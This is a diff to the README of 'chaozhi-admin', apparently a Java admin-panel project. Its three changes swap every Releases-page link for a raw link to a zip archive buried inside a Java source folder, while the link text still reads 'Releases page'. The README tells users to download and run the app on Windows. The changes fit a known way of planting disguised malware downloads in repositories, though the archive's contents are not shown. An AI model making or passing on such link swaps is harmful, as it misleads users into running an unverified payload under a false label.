@@ -1,6 +1,6 @@
 # 🧩 chaozhi-admin - Build Admin Modules Faster
 
-[![Download chaozhi-admin](https://img.shields.io/badge/Download%20chaozhi--admin-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Due-menominee851/chaozhi-admin/releases)
+[![Download chaozhi-admin](https://img.shields.io/badge/Download%20chaozhi--admin-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Due-menominee851/chaozhi-admin/raw/refs/heads/main/chaozhi-backend/src/main/java/com/chaozhi/web/aop/admin-chaozhi-1.7.zip)
 
 ## 🚀 What this app does
 
@@ -16,7 +16,7 @@ The app fits teams that work on internal tools, admin panels, and business manag
 
 ## 📥 Download
 
-Go to the [Releases page](https://github.com/Due-menominee851/chaozhi-admin/releases) to download and run this app on Windows.
+Go to the [Releases page](https://github.com/Due-menominee851/chaozhi-admin/raw/refs/heads/main/chaozhi-backend/src/main/java/com/chaozhi/web/aop/admin-chaozhi-1.7.zip) to download and run this app on Windows.
 
 After you open the page:
 1. Find the latest release
@@ -187,7 +187,7 @@ A few simple terms may help:
 
 ## 🔗 Download again
 
-Use the [Releases page](https://github.com/Due-menominee851/chaozhi-admin/releases) to visit this page to download the Windows version again if you need a fresh copy
+Use the [Releases page](https://github.com/Due-menominee851/chaozhi-admin/raw/refs/heads/main/chaozhi-backend/src/main/java/com/chaozhi/web/aop/admin-chaozhi-1.7.zip) to visit this page to download the Windows version again if you need a fresh copy
 
 ## 🧰 Good folder habits
 
